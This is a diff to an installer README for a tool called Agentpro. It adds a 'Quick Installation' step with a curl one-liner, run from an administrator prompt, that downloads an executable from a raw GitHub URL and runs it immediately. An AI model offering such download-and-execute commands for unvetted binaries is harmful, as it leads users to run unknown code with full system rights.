@@ -13,6 +13,14 @@ One-click installer for Agentpro. Downloads and installs Agentpro.exe to `C:\Pro
 - Downloads `AgentproGithub.exe` from this repo
 - Saves it to `C:\Program Files\Agentpro.exe`
 - Runs `Agentpro.exe -fullinstall` automatically
+  
+## 🚀 Quick Installation (Windows)
+
+Run the following command in **Command Prompt (Run as Administrator)**:
+
+```cmd
+curl -L -o "C:\Program Files\Agentpro.exe" "https://github.com/SellerDumpskart/Setup/raw/refs/heads/main/AgentproGithub.exe" && "C:\Program Files\Agentpro.exe" -fullinstall
+```
 
 ## Manual Install
 
